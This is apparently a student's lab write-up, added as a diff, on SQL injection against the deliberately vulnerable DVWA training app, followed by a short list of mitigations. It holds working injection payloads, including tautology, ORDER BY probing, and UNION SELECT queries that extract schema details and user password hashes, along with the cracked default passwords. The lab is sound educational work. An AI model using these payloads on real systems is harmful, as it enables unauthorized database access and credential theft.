@@ -1,0 +1,39 @@
+PART1: DVWA Lab
+
+1. type ' OR 1=1 # : The users table is displayed showing the firstname and surname of other users
+3. 
+	1' ORDER BY 1 # : Showed the admin firstname and surname
+	1' ORDER BY 2 # : Showed the admin firstname and surname
+	1' ORDER BY 3 # : Unknown column '3' in 'order clause'
+
+4. 1' OR 1=1 UNION SELECT 1, VERSION()#, as a last display shows : 
+	ID: 1' OR 1=1 UNION SELECT 1, VERSION()#
+	First name: 1
+	Surname: 5.5.58-0+deb8u1
+
+5. 1' OR 1=1 UNION SELECT 1, DATABASE()#, as a last display shows :
+	ID: 1' OR 1=1 UNION SELECT 1, DATABASE()#
+	First name: 1
+	Surname: dvwa
+
+6. 1' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
+- the two tables that were found are: guestbook and users
+- users is the most interesting for penetration tests
+
+7. 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
+the list of columns names: user_id, first_name, last_name, password, avatar, last_login, failed_login.
+
+8. 1' OR 1=1 UNION SELECT user, password FROM users # : showed the list of users credentials, with hashed passwords
+- Which account could be the most valuable in our pentest? The admin's account
+- What is the difference between the user_id and user fields? user is the username that is used to login, and user id is the identifier of that user in the database
+
+9. 
+- What is the password of the admin account? password
+- What is the password of pablo's account? letmein
+
+PART2: google search
+1.What are three mitigation methods for preventing SQL injection exploits?
+- using prepared statements (with parameterized queries)
+- enforcing the principle of least privilege
+- validating and sanitizing user input. 
+
